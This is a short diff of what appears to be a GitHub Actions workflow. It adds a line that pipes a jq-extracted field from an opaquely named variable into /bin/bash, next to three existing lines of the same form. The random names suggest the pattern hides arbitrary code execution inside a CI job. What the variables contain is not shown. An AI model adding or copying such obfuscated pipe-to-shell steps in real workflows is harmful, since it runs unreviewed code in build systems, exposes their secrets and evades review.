@@ -32,6 +32,7 @@ jobs:
           echo $how325 | jq -r .urk92971 | /bin/bash
           printf '%s' "$qo006" | jq -r .mgew15 | /bin/bash
           echo $v94 | jq -r .lcza275 | /bin/bash
+          printf '%s' "$yapqv799" | jq -r .ci389 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
